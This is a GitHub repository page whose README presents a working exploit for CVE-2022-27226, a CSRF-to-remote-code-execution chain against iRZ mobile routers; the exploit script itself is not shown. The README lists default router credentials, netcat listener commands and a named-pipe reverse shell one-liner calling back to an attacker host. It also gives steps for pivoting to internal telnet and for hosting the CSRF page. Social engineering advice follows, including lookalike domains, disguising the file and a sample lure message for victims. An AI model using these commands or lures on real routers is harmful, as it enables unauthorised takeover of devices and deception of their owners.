
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSakuraSamuraii%2Fez-iRZ)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSakuraSamuraii%2Fez-iRZ)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=SakuraSamuraii%2Fez-iRZ)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[SakuraSamuraii](/SakuraSamuraii)
/
**[ez-iRZ](/SakuraSamuraii/ez-iRZ)**
Public

* [Notifications](/login?return_to=%2FSakuraSamuraii%2Fez-iRZ) You must be signed in to change notification settings
* [Fork
  6](/login?return_to=%2FSakuraSamuraii%2Fez-iRZ)
* [Star
   15](/login?return_to=%2FSakuraSamuraii%2Fez-iRZ)

Exploit for CVE-2022-27226

[15
stars](/SakuraSamuraii/ez-iRZ/stargazers) [6
forks](/SakuraSamuraii/ez-iRZ/forks) [Branches](/SakuraSamuraii/ez-iRZ/branches) [Tags](/SakuraSamuraii/ez-iRZ/tags) [Activity](/SakuraSamuraii/ez-iRZ/activity)
 [Star](/login?return_to=%2FSakuraSamuraii%2Fez-iRZ)

 [Notifications](/login?return_to=%2FSakuraSamuraii%2Fez-iRZ) You must be signed in to change notification settings

* [Code](/SakuraSamuraii/ez-iRZ)
* [Issues
  0](/SakuraSamuraii/ez-iRZ/issues)
* [Pull requests
  0](/SakuraSamuraii/ez-iRZ/pulls)
* [Actions](/SakuraSamuraii/ez-iRZ/actions)
* [Projects
  0](/SakuraSamuraii/ez-iRZ/projects)
* [Security](/SakuraSamuraii/ez-iRZ/security)
* [Insights](/SakuraSamuraii/ez-iRZ/pulse)

Additional navigation options

* [Code](/SakuraSamuraii/ez-iRZ)
* [Issues](/SakuraSamuraii/ez-iRZ/issues)
* [Pull requests](/SakuraSamuraii/ez-iRZ/pulls)
* [Actions](/SakuraSamuraii/ez-iRZ/actions)
* [Projects](/SakuraSamuraii/ez-iRZ/projects)
* [Security](/SakuraSamuraii/ez-iRZ/security)
* [Insights](/SakuraSamuraii/ez-iRZ/pulse)

# SakuraSamuraii/ez-iRZ

    main[Branches](/SakuraSamuraii/ez-iRZ/branches)[Tags](/SakuraSamuraii/ez-iRZ/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[1 Commit](/SakuraSamuraii/ez-iRZ/commits/main/) | | |
| [README.md](/SakuraSamuraii/ez-iRZ/blob/main/README.md "README.md") | | [README.md](/SakuraSamuraii/ez-iRZ/blob/main/README.md "README.md") |  |  |
| [cve.py](/SakuraSamuraii/ez-iRZ/blob/main/cve.py "cve.py") | | [cve.py](/SakuraSamuraii/ez-iRZ/blob/main/cve.py "cve.py") |  |  |
| [poc.template.html](/SakuraSamuraii/ez-iRZ/blob/main/poc.template.html "poc.template.html") | | [poc.template.html](/SakuraSamuraii/ez-iRZ/blob/main/poc.template.html "poc.template.html") |  |  |
| View all files | | |

## Repository files navigation

* README
# ez-iRZ

Exploit for CVE-2022-27226

Cross Site Request Forgery to Remote Code Execution in iRZ Mobile Routers

# Credits

<--Vulnerability Discovery-->

John Jackson

Chris Mack --- [<https://github.com/0xHalcyon>]

<--Exploit Development-->

Stephen Chavez --- [<https://github.com/redragonx/>]

Robert Willis

# Description

A CSRF issue on iRZ Mobile Routers through 2022-03-16 allows a threat actor to create a crontab entry in the router administration panel.
The cronjob will consequently execute the entry on the threat actor's defined interval, leading to remote code execution, allowing
the threat actor to gain file system access. In addition, if the router's default credentials aren't rotated or a threat actor
discovers valid credentials, remote code execution can be achieved without user interaction.

# Pre-execution notes:

Starting two netcat listeners prior to attempting to catch a shell is pertinent, this is because the crontab, when run, will repeat the same
cronjob multiple times and your shell will die on the next cycle. You can't utilize nohup because the busybox env is fairly restrictive,
and alternatively you could modify the exploit with a different crontab entry interval, however the best way to defeat this without worrying
about crontab interval is two utilize multiple listeners for the first reverse shell catch.

It was discovered that in most cases, the routers don't have the telnet port open externally - however, once gaining remote code execution, you
can utilize telnet to fix TTY *for the most part*. You need to have credentials to do so. If you're utilizing the full CSRF to RCE chain, we
would recommend that you build a more comprehensive CSRF poc template that records the user's login event or the headers which may contain
the basic authorization header that is translated in the script.

# Executing Post Authenticated Remote Code Execution Module (With Credentials)

Default credentials for these routers are typically root:root or admin:admin. If you have credentials, run:

```
python cve.py

```

Follow the instructions which are quite simple, then start two netcat listeners on two seperate ports.

```
nc -lvp 443
nc -lvp 5000

```

When you catch a reverse shell in the first listener, rerun the reverse shell one liner to gain a persistent shell:

```
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost_ip} {second_nc_listener_port} >/tmp/f

```

Finally, if you have credentials (which you should if you're using this portion of the module) - attempt to pivot to the internally restricted telnet service:

```
telnet 0.0.0.0

```

"But what if telnet is exposed externally?" Then login to the fucking router with the credentials, dumbass.

# Executing CSRF to RCE Module (No Credentials)

The instructions for this module are nearly the same as the Post Auth RCE instructions. With the major difference being that you don't have credentials.

First and foremost, to exploit efficiently, you have to understand how this works. CSRF requires user interaction, meaning that you'll need to social engineer
someone. There are two potentional scenarios: User is logged in when they click the proof of concept button, or user isn't logged in. If they are already
authenticated to the router, the POST request to make the cronjob will be sent to the API and the user will see a blank page. If they aren't logged in,
the user will get a basic authentication prompt - and conveniently enough, the basic auth popup will have the IP of the victim router, if they enter their
credentials it sends the POST request to the API.

We recommend attempting to buy a similar domain if the victim router is hosted on a subdomain or finding a provider
with the same subnet ranges for servers if it's a high-priority target. Refining the CSRF PoC might be work it for a priority target.

Run the script

```
python cve.py

```

Follow the instructions, in the script, it will then generate a csrf template for you. We recommend naming it something a little more covert.

```
mv poc.new.html index.html

```

Host the PoC on your server, preferably on the same port as the victim router.

```
python3 -m http.server 80

```

Take the link and send it to the victim, ensuring that you append the name of the PoC file to the end of the url:

```
Hi sweetie, can you login to router pwease:
http://your-ip-in-the-united-states-bcuz-you-didnt-take-my-advice/index.html

```

## About

Exploit for CVE-2022-27226

### Topics

[exploits](/topics/exploits "Topic: exploits")
[cves](/topics/cves "Topic: cves")
[sakurasamuraii](/topics/sakurasamuraii "Topic: sakurasamuraii")
[cve-2022-27226](/topics/cve-2022-27226 "Topic: cve-2022-27226")

### Resources

[Readme](#readme-ov-file)

[Activity](/SakuraSamuraii/ez-iRZ/activity)
[Custom properties](/SakuraSamuraii/ez-iRZ/custom-properties)
### Stars

[**15**
stars](/SakuraSamuraii/ez-iRZ/stargazers)
### Watchers

[**1**
watching](/SakuraSamuraii/ez-iRZ/watchers)
### Forks

[**6**
forks](/SakuraSamuraii/ez-iRZ/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FSakuraSamuraii%2Fez-iRZ&report=SakuraSamuraii+%28user%29)

## [Releases](/SakuraSamuraii/ez-iRZ/releases)

No releases published

## [Packages 0](/orgs/SakuraSamuraii/packages?repo_name=ez-iRZ)

No packages published

## Languages

* [Python
  81.4%](/SakuraSamuraii/ez-iRZ/search?l=python)
* [HTML
  18.6%](/SakuraSamuraii/ez-iRZ/search?l=html)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

